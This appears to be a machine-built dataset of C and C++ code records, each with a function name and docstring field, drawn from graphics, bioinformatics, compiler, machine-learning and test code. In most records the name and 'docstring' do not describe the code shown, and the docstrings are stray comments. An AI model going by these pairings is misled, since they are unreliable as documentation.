{"content":"{'function_name': 'Dictionary_2_System_Collections_ICollection_CopyTo_m8521E03ECC98EFED37EE94DB802E62C9527C81A8_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'IL2CPP_METHOD_ATTR void Dictionary_2_System_Collections_IDictionary_set_Item_m628942C62121D1661E9DBCE25DD9E4333B516F64_gshared (Dictionary_2_t03608389BB57475AA3F4B2B79D176A27807BC884 * __this, RuntimeObject * ___key0, RuntimeObject * ___value1, const RuntimeMethod* method)\\n{\\n\\tstatic bool s_Il2CppMethodInitialized;\\n\\tif (!s_Il2CppMethodInitialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_System_Collections_IDictionary_set_Item_m628942C62121D1661E9DBCE25DD9E4333B516F64_MetadataUsageId);\\n\\t\\ts_Il2CppMethodInitialized = true;\\n\\t}\\n\\tRuntimeObject * V_0 = NULL;\\n\\tint32_t V_1 = 0;\\n\\tException_t * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = -1;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tRuntimeObject * L_0 = ___key0;\\n\\t\\tif (L_0)\\n\\t\\t{\\n\\t\\t\\tgoto IL_000e;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_1 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_1, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_1, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m628942C62121D1661E9DBCE25DD9E4333B516F64_RuntimeMethod_var);\\n\\t}\\n\\nIL_000e:\\n\\t{\\n\\t\\tRuntimeObject * L_2 = ___value1;\\n\\t\\tif (L_2)\\n\\t\\t{\\n\\t\\t\\tgoto IL_002c;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\til2cpp_codegen_initobj((&V_0), sizeof(RuntimeObject *));\\n\\t\\tRuntimeObject * L_3 = V_0;\\n\\t\\tif (!L_3)\\n\\t\\t{\\n\\t\\t\\tgoto IL_002c;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_4 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_4, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_4, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m628942C62121D1661E9DBCE25DD9E4333B516F64_RuntimeMethod_var);\\n\\t}\\n\\nIL_002c:\\n\\t{\\n\\t}\\n\\nIL_002d:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tRuntimeObject * L_5 = ___key0;\\n\\t\\t\\tV_1 = (int32_t)((*(int32_t*)((int32_t*)UnBox(L_5, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 27)))));\\n\\t\\t}\\n\\nIL_0034:\\n\\t\\ttry\\n\\t\\t{ \/\/ begin try (depth: 2)\\n\\t\\t\\tint32_t L_6 = V_1;\\n\\t\\t\\tRuntimeObject * L_7 = ___value1;\\n\\t\\t\\tNullCheck((Dictionary_2_t03608389BB57475AA3F4B2B79D176A27807BC884 *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t03608389BB57475AA3F4B2B79D176A27807BC884 *, int32_t, RuntimeObject *, const RuntimeMethod*))IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35)->methodPointer)((Dictionary_2_t03608389BB57475AA3F4B2B79D176A27807BC884 *)__this, (int32_t)L_6, (RuntimeObject *)((RuntimeObject *)Castclass((RuntimeObject*)L_7, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 17))), \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35));\\n\\t\\t\\tgoto IL_0064;\\n\\t\\t} \/\/ end try (depth: 2)\\n\\t\\tcatch(Il2CppExceptionWrapper& e)\\n\\t\\t{\\n\\t\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\t\\tgoto CATCH_0043;\\n\\t\\t\\tthrow e;\\n\\t\\t}\\n\\nCATCH_0043:\\n\\t\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\t\\tRuntimeObject * L_8 = ___value1;\\n\\t\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_9 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 36)) };\\n\\t\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\t\\tType_t * L_10 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_9, \/*hidden argument*\/NULL);\\n\\t\\t\\tString_t* L_11 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_8, (RuntimeObject *)L_10, \/*hidden argument*\/NULL);\\n\\t\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_12 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_12, (String_t*)L_11, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_12, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m628942C62121D1661E9DBCE25DD9E4333B516F64_RuntimeMethod_var);\\n\\t\\t} \/\/ end catch (depth: 2)\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0087;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\tgoto CATCH_0066;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0066:\\n\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\tRuntimeObject * L_13 = ___key0;\\n\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_14 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 37)) };\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_15 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_14, \/*hidden argument*\/NULL);\\n\\t\\tString_t* L_16 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_13, (RuntimeObject *)L_15, \/*hidden argument*\/NULL);\\n\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_17 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_17, (String_t*)L_16, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_17, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m628942C62121D1661E9DBCE25DD9E4333B516F64_RuntimeMethod_var);\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0087:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":3880}
{"content":"{'function_name': 'nu_score', 'docstring': '\/\/ ((matches * 100) \/ len) \/ ((4. * p) \/ (len * len))', 'code': 'float nu_matches_chi2 (char* xseq, int xpos, char* yseq, int ypos, int len)\\n{\\n    int i;\\n    int xn[4], yn[4];\\n    int evt[5];\\n    float exp[5];\\n    float diff, chi2;\\n\\n    if (len == 0) return 0.;\\n\\n    \/\/reset nucleotide composition and event count\\n    for (i = 0; i < 4; i++)\\n        xn[i] = 0, yn[i] = 0, evt[i] = 0;\\n\\n    \/\/calculate nucleotide composition and match count\\n    for (i = 0, evt[4] = len; i < len; i++)\\n    {\\n        int xb = get_base(xseq, xpos + i);\\n        int yb = get_base(yseq, ypos + i);\\n        xn[xb]++, yn[yb]++;\\n        if (xb == yb) evt[xb]++, evt[4]--;\\n    }\\n\\n    \/\/calculate expected event counts based on nucleotide composition\\n    for (i = 0, exp[4] = (float) len; i < 4; i++)\\n    {\\n        exp[i] = (float) xn[i] * yn[i] \/ len;\\n        exp[4] -= exp[i];\\n    }\\n\\n    \/\/calculate chi^2\\n    \/\/direct form: chi2 = sum{1..k} ((Ys - nPs) ^ 2 \/ nPs)\\n    for (i = 0, chi2 = 0.; i < 5; i++)\\n        if (exp[i] > 0.)\\n        {\\n            diff = exp[i] - evt[i];\\n            chi2 += diff * diff \/ exp[i];\\n        }\\n\\n    return chi2;\\n}'}","id":3882}
{"content":"{'function_name': 'demosaic_rd1_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<32> demosaicb_demosaic_update_0_read_bundle_read(demosaicb_cache& demosaicb, int d0, int d1) {\\n  \/\/ # of ports in bundle: 2\\n    \/\/ demosaic_rd0\\n    \/\/ demosaic_rd1\\n\\n\\thw_uint<32> result;\\n\\thw_uint<16> demosaic_rd0_res = demosaic_rd0_select(demosaicb, d0, d1);\\n\\tset_at<0, 32>(result, demosaic_rd0_res);\\n\\thw_uint<16> demosaic_rd1_res = demosaic_rd1_select(demosaicb, d0, d1);\\n\\tset_at<16, 32>(result, demosaic_rd1_res);\\n\\treturn result;\\n}'}","id":3885}
{"content":"{'function_name': 'fillNote', 'docstring': '\/\/ Draw a two slightly offset circles centred on appropriate line or space', 'code': 'void printNote (uint8_t note) {\\n  if ((note < LOWEST_NOTE) || (note > HIGHEST_NOTE)) {\\n    return;\\n  }\\n  \/\/ Y coordinates start from 0 at the top, so need to \\n  \/\/ take the starting Y coordinate for the notes and\\n  \/\/ add the distances from the lookup table to get to\\n  \/\/ the right note.\\n  int noteY = NOTE_YS + notecoords[note-LOWEST_NOTE]*NOTE_YO;\\n  if (noteY != 0) {\\n    if (sharps[note-LOWEST_NOTE]) {\\n      fillNote(note, NOTE_SXO, noteY, ST77XX_BLACK);\\n      fillSharp(noteY, ST77XX_BLACK);\\n    } else {\\n      fillNote(note, NOTE_XO, noteY, ST77XX_BLACK);\\n    }\\n  }\\n}'}","id":3889}
{"content":"{'function_name': 'GetCurTime', 'docstring': '\/\/strftime ( szTime, sizeof ( szTime ), \"%m-%d-%Y %H:%M:%S\", &starttm );', 'code': 'int FilterTempFile(std::wstring _strTmp)\\n{\\n\\t\/\/\u5b9e\u73b0\u65b9\u6cd5\uff1a\\n\\t\/\/ if\\n\\t\/\/ 1:\u9996\u5148\u5224\u65ad\u6587\u4ef6\u7684\u6269\u5c55\u540d\u662f\u5426\u662f\u5728\u4e0d\u5904\u7406\u7684\u8303\u56f4\u5f53\u4e2d true return\\n\\t\/\/ else\\n\\t\/\/ 2:\u5224\u65ad\u6587\u4ef6\u540d\u5f53\u4e2d\u662f\u5426\u6709\u7279\u6b8a\u5b57\u7b26\u4e32   true return\\n\\t\/\/ return false\\n\\twstring wstrFileName;\\n\\twstring wstrFile = _strTmp;\\n\\twchar_t *pstrExtension[] = {L\".tmp\",L\".~vsd\",L\".ldb\"};\/\/\u6269\u5c55\u540d\u5224\u65ad\\n\\t\\n\\twchar_t *pstrFileName[]  = {L\"~$\"};\/\/\u6587\u4ef6\u540d\u5224\u65ad\\n\\t\/\/\u67e5\u627e\u6269\u5c55\u540d \u662f\u5426\u5305\u542b\u5728pstrExtension\u5f53\u4e2d\\n\\tstring::size_type sPos = wstrFile.find_last_of(L\".\");\\n\\tD_Log::WriteLog ( D_Log::LOG_NORMAL, L\"[ %s ] = [%d]\\\\n\",wstrFile.c_str(),sPos);\\n\\t int iLen = wstrFile.length();\\n\\t if (sPos != string::npos)\\n\\t {\\n\\t\\t wstring wstrTemp =  wstrFile.substr(sPos,iLen);\\n\\t\\t for (int i=0;i<3;i++)\\n\\t\\t {\\n\\t\\t\\t wstring wstr = pstrExtension[i];\\n\\t\\t\\tif(wstrTemp ==wstr)\\n\\t\\t\\t{\\n\\t\\t\\t\\tif (i==0)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\treturn 2;\\n\\t\\t\\t\\t}\\n\\t\\t\\t\\telse\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\treturn 1;\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t }\\n\\t }\\n\\t\\n\\t\/\/\u67e5\u8be2\u6587\u4ef6\u540d\u5f53\u4e2d\u662f\u5426\u5305\u542bpstrFileName\\n\\n\\twstring wstrTemp =  wstrFile.substr(0,2);\\n\\twstring wstr     =  pstrFileName[0];\\n\\tif (wstrTemp == wstr)\\n\\t{\\n\\t\\treturn 1;\\n\\t}\\n\\n\\treturn 0;\\n}'}","id":3896}
{"content":"{'function_name': 'VkToPalImageResolveRegion', 'docstring': '\/\/ aspect masks separately.', 'code': \"Pal::MemoryImageCopyRegion VkToPalMemoryImageCopyRegion(\\n    const BufferImageCopyType&  bufferImageCopy,\\n    Pal::ChNumFormat            format,\\n    uint32                      plane,\\n    uint32_t                    arraySize,\\n    Pal::gpusize                baseMemOffset)\\n{\\n    Pal::MemoryImageCopyRegion region = {};\\n\\n    region.imageSubres.plane        = plane;\\n    region.imageSubres.arraySlice   = bufferImageCopy.imageSubresource.baseArrayLayer;\\n    region.imageSubres.mipLevel     = bufferImageCopy.imageSubresource.mipLevel;\\n\\n    region.imageOffset          = VkToPalOffset3d(bufferImageCopy.imageOffset);\\n    region.imageExtent          = VkToPalExtent3d(bufferImageCopy.imageExtent);\\n\\n    region.numSlices            = (bufferImageCopy.imageSubresource.layerCount == VK_REMAINING_ARRAY_LAYERS) ?\\n        (arraySize - bufferImageCopy.imageSubresource.baseArrayLayer) : bufferImageCopy.imageSubresource.layerCount;\\n\\n    region.gpuMemoryOffset      = baseMemOffset + bufferImageCopy.bufferOffset;\\n    region.gpuMemoryRowPitch    = (bufferImageCopy.bufferRowLength != 0)\\n                                    ? bufferImageCopy.bufferRowLength\\n                                    : bufferImageCopy.imageExtent.width;\\n    region.gpuMemoryDepthPitch  = (bufferImageCopy.bufferImageHeight != 0)\\n                                    ? bufferImageCopy.bufferImageHeight\\n                                    : bufferImageCopy.imageExtent.height;\\n\\n    \/\/ For best performance, let PAL choose the copy format\\n    region.swizzledFormat = Pal::UndefinedSwizzledFormat;\\n\\n    \/\/ PAL expects all dimensions to be in blocks for compressed formats so let's handle that here\\n    if (Pal::Formats::IsBlockCompressed(format))\\n    {\\n        Pal::Extent3d blockDim      = Pal::Formats::CompressedBlockDim(format);\\n\\n        region.imageExtent          = TexelsToBlocks(region.imageExtent, blockDim);\\n        region.imageOffset          = TexelsToBlocks(region.imageOffset, blockDim);\\n        region.gpuMemoryRowPitch    = PitchTexelsToBlocks(region.gpuMemoryRowPitch, blockDim.width);\\n        region.gpuMemoryDepthPitch  = PitchTexelsToBlocks(region.gpuMemoryDepthPitch, blockDim.height);\\n    }\\n\\n    \/\/ Convert pitch to bytes per pixel and multiply depth pitch by row pitch after the texel-to-block conversion\\n    region.gpuMemoryRowPitch   *= BytesPerPixel(format, plane);\\n    region.gpuMemoryDepthPitch *= region.gpuMemoryRowPitch;\\n\\n    return region;\\n}\"}","id":3898}
{"content":"{'function_name': 'DCCDisp_MemBinMem', 'docstring': '\/* Handle the rest. *\/', 'code': \"PUBLIC void\\nDCCDisp_VecBinMem(tok_t op,   void const *__restrict src, target_siz_t src_bytes,\\n                  struct DCCMemLoc const *__restrict dst, target_siz_t dst_bytes,\\n                  int src_unsigned) {\\n void *cdst; struct DCCSymAddr cst;\\n struct DCCMemLoc dst_iter;\\n struct DCCSym *jsym = NULL;\\n target_siz_t common_size;\\n \/* Special case: Static, compile-time operation. *\/\\n if ((cdst = DCCMemLoc_CompilerAddrUpdate(dst,(void **)&src,dst_bytes)) != NULL) {\\n  DCCDisp_StaBinSta(op,src,src_bytes,cdst,dst_bytes,src_unsigned);\\n  return;\\n }\\n if (op == '=') { DCCDisp_VecMovMem(src,src_bytes,dst,dst_bytes,src_unsigned); return; }\\n if (!src_bytes) { DCCDisp_BytBinMem(op,0,dst_bytes,dst,dst_bytes,src_unsigned); return; }\\n if (dst_bytes > DCC_TARGET_SIZEOF_ARITH_MAX && IS_LARGE_OP(op)) {\\n  DCCDisp_LargeVecBinMem(op,src,src_bytes,\\n                            dst,dst_bytes,\\n                         src_unsigned);\\n  return;\\n }\\n common_size = src_bytes < dst_bytes ? src_bytes : dst_bytes;\\n dst_bytes -= common_size;\\n cst.sa_sym = NULL;\\n dst_iter = *dst;\\n while (common_size) {\\n  width_t width;\\n#if DCC_TARGET_SIZEOF_ARITH_MAX >= 8\\n       if (common_size >= 8) width = 8,cst.sa_off = (target_off_t)*(int64_t *)src;\\n  else\\n#endif\\n       if (common_size >= 4) width = 4,cst.sa_off = (target_off_t)*(int32_t *)src;\\n  else if (common_size >= 2) width = 2,cst.sa_off = (target_off_t)*(int16_t *)src;\\n  else                       width = 1,cst.sa_off = (target_off_t)*(int8_t *)src;\\n  DCCDisp_CstBinMem(op,&cst,&dst_iter,width,src_unsigned);\\n  dst_iter.ml_off    += width;\\n  *(uintptr_t *)&src += width;\\n  common_size        -= width;\\n       if (op == '+') op = TOK_INC;\\n  else if (op == '-') op = TOK_DEC;\\n  else if (op == '?' && common_size) {\\n   \/* Special handling for compare operations. *\/\\n   if (jsym || (jsym = DCCUnit_AllocSym()) != NULL)\\n        DCCDisp_SymJcc(DCC_TEST_NE,jsym);\\n  }\\n }\\n \/* Handle the remainder. *\/\\n DCCDisp_BytBinMem(op,0,dst_bytes,dst,dst_bytes,src_unsigned);\\n if (jsym) t_defsym(jsym);\\n}\"}","id":3901}
{"content":"{'function_name': 'hungarian', 'docstring': '\/\/ \u0412\u0435\u0440\u043d\u0435\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u0432 \u0435\u0441\u0442\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0439 \u0444\u043e\u0440\u043c\u0435', 'code': 'int galsPoint(double Fs, double Ls, double K0, double V0, double V1, float T, float t, float a, double *Fm, double *Lm, double *Vm)\\n{   \\n    if(T <= 0)\\n    {\\n        puts(\"sysmath.h galsPoint function ERROR: Negative or null gals time\");\\n        return -1;\\n    }\\n\/\/     if(t > T)\\n\/\/     {\\n\/\/         puts(\"Sysmath galsPoint function ERROR: Current time more than gals time\");\\n\/\/         return -2;\\n\/\/     }\\n\\tif (t>T) t = T;\\n    \\n\\tif (ABS(V1-V0) < NOL)\\n    \\t{\\n\\t\\tdouble lm = (V0*t) \/ 1000.0;\\n\\t\\tdouble Xm = lm * sin(rad(K0));\\n\\t\\tdouble Ym = lm * cos(rad(K0));\\n\\t\\tCXYFL(Fs,Ls,Xm,Ym,Fm,Lm);\\n    \\n\\t\\tif(Vm) *Vm = V0;\\n    \\n\\t\\treturn 1;\\n\\t} else\\n\\t{\\n\\t\\ta = sign(V1-V0)*a;\\n\\t\\tdouble _t = (V1-V0)\/a;\\n\\t\\tif (_t>t)\\n\\t\\t{\\n\\t\\t\\tdouble lm = (V0*t + a*t*t\/2) \/ 1000.0;\\n\\t\\t\\tdouble Xm = lm * sin(rad(K0));\\n\\t\\t\\tdouble Ym = lm * cos(rad(K0));\\n\\t\\t\\tCXYFL(Fs,Ls,Xm,Ym,Fm,Lm);\\n    \\n\\t\\t\\tif(Vm) *Vm = V0+a*t;\\n    \\n\\t\\t\\treturn 1;\\n\\t\\t}\\n\\t\\t\\n\\t\\tdouble S = V0*_t+a*_t*_t\/2;\\n\\t\\tdouble tr = t-_t;\\n\\t\\t\\n\\t\\tdouble lm = (V1*tr + S)\/1000.0;\\n\\t\\tdouble Xm = lm * sin(rad(K0));\\n\\t\\tdouble Ym = lm * cos(rad(K0));\\n\\t\\tCXYFL(Fs,Ls,Xm,Ym,Fm,Lm);\\n    \\n\\t\\tif(Vm) *Vm = V1;\\n    \\n\\t\\treturn 1;\\t\\t\\n\\t}\\n}'}","id":3902}
{"content":"{'function_name': 'get_file_list', 'docstring': '\/\/pm(m);', 'code': 'vstr line_split(const string & line,const string &key)\\n{\\n\\tvstr ret;\\n\\t\/\/rm_nl(line);\\n\\tstring::size_type pos = line.find_last_of(key);\\n\\tif(string::npos == pos)\\n\\t{\\n\\t\\t\/\/cerr<<\"Err file name \"<<line<<endl;\\n\\t\\treturn ret;\\n\\t}\\n\\tret.push_back(string(line.c_str(),pos));\\n\\tret.push_back(string((line.c_str()+pos+key.size())));\\n\\t\/\/cout<<ret[0]<<endl;\\n\\t\/\/cout<<ret[1]<<endl;\\n\\treturn ret;\\n}'}","id":3908}
{"content":"{'function_name': 'solveFEM', 'docstring': '\/\/ if I dont consider boundary condition here, but just solve for all', 'code': 'Matrix<T, Dynamic, 1> solveFEM_Entropic( const MATRIX& mass,const VECTOR& conv, const VECTOR& last_term, const Fonction& phi_old , T dt )\\n{\\n    \/\/ if I dont consider boundary condition here, but just solve for all-> look to solveFEM\\n    auto b = phi_old - dt * conv + dt * last_term;\\n    \\n    return mass.completeOrthogonalDecomposition().solve(b);\\n    \\n    \\n}'}","id":3921}
{"content":"{'function_name': 'base64Encode', 'docstring': '\/\/ Encode the remaining data', 'code': 'static std::string Mat2Base64(const cv::Mat &img, std::string imgType)\\n{\\n\\t \/\/Mat to base64\\n\\tstd::string img_data;\\n\\tstd::vector<uchar> vecImg;\\n\\tstd::vector<int> vecCompression_params;\\n\\tvecCompression_params.push_back(CV_IMWRITE_JPEG_QUALITY);\\n\\tvecCompression_params.push_back(90);\\n\\timgType = \".\" + imgType;\\n\\tcv::imencode(imgType, img, vecImg, vecCompression_params);\\n\\timg_data = base64Encode(vecImg.data(), vecImg.size());\\n\\treturn img_data;\\n}'}","id":3924}
{"content":"{'function_name': 'Mat2Tensor', 'docstring': '\/\/\u4e0d\u9700\u8981\u68af\u5ea6', 'code': 'Mat Tensor2Mat(const Tensor& tensor){\\n    int c = tensor.size(1);\\n    int h = tensor.size(2);\\n    int w = tensor.size(3);\\n\/\/    cout<<\"out: \"<<tensor<<endl;\\n\\n    auto out_tensor = denorm(tensor);\\n    out_tensor = out_tensor.mul(255).add(0.5).clamp(0, 255).permute({0,2,3,1}).to(torch::kCPU,torch::kUInt8,false,false,torch::MemoryFormat::Contiguous);\\n\/\/    out_tensor = out_tensor.to(torch::kCPU);\\n    if(c==1){\\n        Mat m = Mat(h, 2, CV_8UC1, Scalar(255));\\n\\n        \/\/    cout<<\"out size : \"<<out_tensor.sizes()<<endl;\\n        if(out_tensor.size(0)>1){\\n            Mat combine;\\n            vector<Mat> out_lists;\\n            for(int n=0;n<out_tensor.size(0);n++){\\n                auto  out = out_tensor[n];\\n\\n                cv::Mat Mat_out(cv::Size(h, w), CV_8U, out.data_ptr());\\n                out_lists.push_back(Mat_out);\\n                out_lists.push_back(m);\\n\\n                \/\/        tensor_lists.\\n\\n            }\\n            hconcat(out_lists,combine);\\n            Mat out = combine.clone();\\n            return out;\\n        }else{\\n            cv::Mat Mat_out(cv::Size(h, w), CV_8U, out_tensor.data_ptr());\\n            Mat out = Mat_out.clone();\\n            return out;\\n            \/\/        return out_tensor\uff1b\\n        }\\n    }else if(c==3){\\n        Mat m = Mat(h, 2, CV_8UC3, Scalar(255,255,255));\\n\\n        \/\/    cout<<\"out size : \"<<out_tensor.sizes()<<endl;\\n        if(out_tensor.size(0)>1){\\n            Mat combine;\\n            vector<Mat> out_lists;\\n            for(int n=0;n<out_tensor.size(0);n++){\\n                auto  out = out_tensor[n];\\n\\n                cv::Mat Mat_out(cv::Size(h, w), CV_8UC3, out.data_ptr());\\n                out_lists.push_back(Mat_out);\\n                out_lists.push_back(m);\\n\\n                \/\/        tensor_lists.\\n\\n            }\\n            hconcat(out_lists,combine);\\n            Mat out = combine.clone();\\n            return out;\\n        }else{\\n            cv::Mat Mat_out(cv::Size(h, w), CV_8UC3, out_tensor.data_ptr());\\n            Mat out = Mat_out.clone();\\n            return out;\\n            \/\/        return out_tensor\uff1b\\n        }\\n    }else{\\n        cout<<\"error channel is not 1 or 3 !\"<<endl;\\n    }\\n\\n\/\/    at::TensorList tensor_lists;\\n\\n}'}","id":3926}
{"content":"{'function_name': 'InitDInput', 'docstring': '\/* Initialises DInput devices and settings *\/', 'code': 'HRESULT InitDX(HWND hwnd, HINSTANCE hInstance) {\\n\\t\/* Initialises all DirectX init functions previously defined *\/\\n\\tInitDInput(hwnd, hInstance);\\n\\tif(FAILED(InitD3D(hwnd))) {\\n\\t\\t return (HRESULT)1;\\n\\t}\\n\\telse {\\n\\t\\t return (HRESULT)0;\\n\\t}\\n}'}","id":3934}
{"content":"{'function_name': 'compare', 'docstring': '\/\/return the car which has less distance from you that is origin\\r', 'code': 'int main()\\r\\n{\\r\\n    int n;\\r\\n    cin>>n; \/\/no of cars\\r\\n    vector<pair<int,int>> v;\\r\\n\\r\\n    for(int i=0;i<n;i++)\\r\\n    {\\r\\n        int x,y;\\r\\n        cin>>x>>y;\\r\\n        v.push_back(make_pair(x,y));\\r\\n    }\\r\\n\\r\\n    sort(v.begin(),v.end(),compare); \/\/compare-> to compare the positions of 2 cars\\r\\n\\r\\n    for(auto p:v)\\r\\n    {\\r\\n        cout<<\"car \"<<p.first<<\",\"<<p.second<<endl;\\r\\n    }\\r\\n\\r\\n    return 0;\\r\\n}'}","id":3935}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ After returning the buffers, the session is closed and teardown completes.', 'code': 'TEST_F(NetworkDeviceTest, PortGetRxCounters) {\\n  ASSERT_OK(CreateDeviceWithPort13());\\n\\n  TestSession session;\\n  ASSERT_OK(OpenSession(&session));\\n  ASSERT_OK(AttachSessionPort(session, port13_));\\n\\n  zx::result port = OpenPort(kPort13);\\n  ASSERT_OK(port.status_value());\\n  fidl::WireSyncClient port_connection = std::move(port.value());\\n\\n  constexpr uint16_t kDescriptors[] = {kDescriptorIndex0, kDescriptorIndex1, kDescriptorIndex2,\\n                                       kDescriptorIndex3};\\n  for (const uint16_t desc : kDescriptors) {\\n    session.ResetDescriptor(desc);\\n  }\\n  size_t actual;\\n  ASSERT_OK(session.SendRx(kDescriptors, std::size(kDescriptors), &actual));\\n  ASSERT_EQ(actual, std::size(kDescriptors));\\n  ASSERT_OK(WaitRxAvailable());\\n\\n  constexpr uint32_t kReturnLength = 17;\\n\\n  auto prepare_return_buffer = [this]() -> std::unique_ptr<RxReturn> {\\n    std::unique_ptr buffer = impl_.PopRxBuffer();\\n    if (!buffer) {\\n      return nullptr;\\n    }\\n    buffer->SetReturnLength(kReturnLength);\\n    return std::make_unique<RxReturn>(std::move(buffer), kPort13);\\n  };\\n\\n  auto assert_counters = [&port_connection](uint64_t frames, uint64_t bytes,\\n                                            std::string_view scope) {\\n    SCOPED_TRACE(scope);\\n    fidl::WireResult r = port_connection->GetCounters();\\n    ASSERT_OK(r.status());\\n    fidl::WireResponse rsp = std::move(r.value());\\n    ASSERT_TRUE(rsp.has_rx_bytes());\\n    EXPECT_EQ(rsp.rx_bytes(), bytes);\\n    ASSERT_TRUE(rsp.has_rx_frames());\\n    EXPECT_EQ(rsp.rx_frames(), frames);\\n\\n    ASSERT_TRUE(rsp.has_tx_frames());\\n    EXPECT_EQ(rsp.tx_frames(), 0u);\\n    ASSERT_TRUE(rsp.has_tx_bytes());\\n    EXPECT_EQ(rsp.tx_bytes(), 0u);\\n  